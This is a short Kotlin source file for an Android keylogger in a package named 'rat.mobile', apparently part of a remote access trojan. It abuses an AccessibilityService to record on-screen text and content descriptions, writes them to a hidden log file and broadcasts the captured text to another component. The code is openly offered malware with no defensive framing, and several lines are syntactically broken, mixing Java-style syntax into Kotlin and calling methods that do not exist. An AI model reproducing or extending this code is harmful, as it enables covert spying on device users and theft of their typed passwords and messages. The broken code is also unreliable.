package rat.mobile

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.widget.Toast
import java.io.File

class KeylogService : AccessibilityService() {
    private val LOG_FILE = "/data/data/rat.mobile/keylog.log"
    private val stringBuilder = StringBuilder()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val text = event.text
        if (text != null && text.isNotEmpty()) {
            for (CharSequence item in text) {
                stringBuilder.append(item).append(" ")
            }
        }

        val contentDesc = event.contentDescription
        if (contentDesc != null) {
            stringBuilder.append(contentDesc).append(" ")
        }

        saveLogIfNeeded()
    }

    private fun saveLogIfNeeded() {
        if (stringBuilder.length() > 0) {
            val file = File(LOG_FILE)
            file.parentFile?.mkdirs()
            file.appendText(stringBuilder.toString())
            stringBuilder.clear()
        }
    }

    onBufferRequest(buffer: String?) {
        if (buffer != null && buffer.isNotEmpty()) {
            sendKeylogEvent(buffer)
        }
    }

    private fun sendKeylogEvent(text: String) {
        val intent = Intent("rat.keylog.event")
        intent.putExtra("text", text)
        broadcastSynchronously(intent)
    }

    override fun onInterrupt() {
        // accessibility service interrupt
    }
}